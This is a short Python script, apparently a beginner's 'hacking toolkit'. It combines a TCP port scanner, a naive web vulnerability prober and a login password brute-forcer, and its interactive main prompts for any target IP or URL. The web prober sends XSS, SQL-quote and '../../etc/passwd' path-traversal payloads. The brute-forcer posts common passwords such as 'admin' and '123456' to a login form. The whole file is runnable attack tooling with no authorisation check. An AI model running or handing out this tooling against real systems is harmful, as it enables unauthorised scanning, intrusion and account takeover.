import socket
import requests
from urllib.parse import urlparse

# ---------- PORT SCANNER ----------
def port_scanner(target, ports=[21, 22, 23, 80, 443, 8080]):
    print(f"\n[+] Scanning ports on {target}...")
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((target, port))
            print(f"[OPEN] Port {port}")
            s.close()
        except:
            pass

# ---------- BASIC WEB VULNERABILITY SCANNER ----------
def simple_web_scanner(url):
    print(f"\n[+] Checking web vulnerabilities on {url}")
    test_payloads = ["'", "\"", "<script>alert('xss')</script>", "../../etc/passwd"]
    for payload in test_payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url)
            if "error" in r.text.lower() or r.status_code >= 500:
                print(f"[!] Potential vulnerability with payload: {payload}")
        except:
            pass

# ---------- PASSWORD BRUTE FORCE (Demo) ----------
def password_brute_force(username, url, password_list):
    print(f"\n[+] Starting brute-force on {url} with user '{username}'")
    for password in password_list:
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data)
            if "Login Successful" in response.text:
                print(f"[✔] Password found: {password}")
                break
        except:
            print("[!] Connection failed.")
            break

# ---------- MAIN ----------
if __name__ == "__main__":
    target_ip = input("Enter target IP for port scan (e.g., 192.168.1.1): ")
    port_scanner(target_ip)

    web_url = input("Enter target website URL (e.g., http://example.com/): ")
    simple_web_scanner(web_url)

    # Brute force (demo - replace with actual login form URL and form fields)
    login_url = input("Enter login form URL (e.g., http://example.com/login): ")
    user = input("Enter username to test: ")
    passwords = ["admin", "123456", "password", "admin123", "root"]
    password_brute_force(user, login_url, passwords)
